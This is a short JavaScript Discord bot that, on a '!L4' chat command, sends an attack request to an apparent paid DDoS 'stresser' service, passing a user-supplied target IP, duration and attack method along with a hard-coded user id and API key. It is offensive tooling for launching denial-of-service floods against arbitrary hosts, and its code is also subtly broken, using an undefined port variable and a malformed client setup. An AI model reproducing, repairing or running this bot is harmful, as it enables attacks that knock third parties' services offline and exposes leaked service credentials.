const ms = require('ms');
const client = new require('discord.js').Client();
const config = require('./config.json');
const { MessageButton, MessageActionRow } = require('discord-buttons');
const disbut = require('discord-buttons');
disbut(client);

const api = require('axios').create('http://zdstresser.net/panel/apiv1/');

async function onReady () {
    console.log('Lets Fucking GO!');
};

async function onMessage (message) {
    if(message.content.startsWith(`!L4`)) {
        const [, alvo, tempo, metodo ] = message.content.split(" ");
        const { response: { data } } = await api.post(`/?userid=16410&key=74YB7-97327-RKBLS&command=post.attack&type=ip4&target=${alvo}&port=${porta}&time=${tempo}&method=id::${metodo}`);
        console.log(data);
    };
};

client.once('ready', onReady);
client.on('message', onMessage);

client.login(config.token);
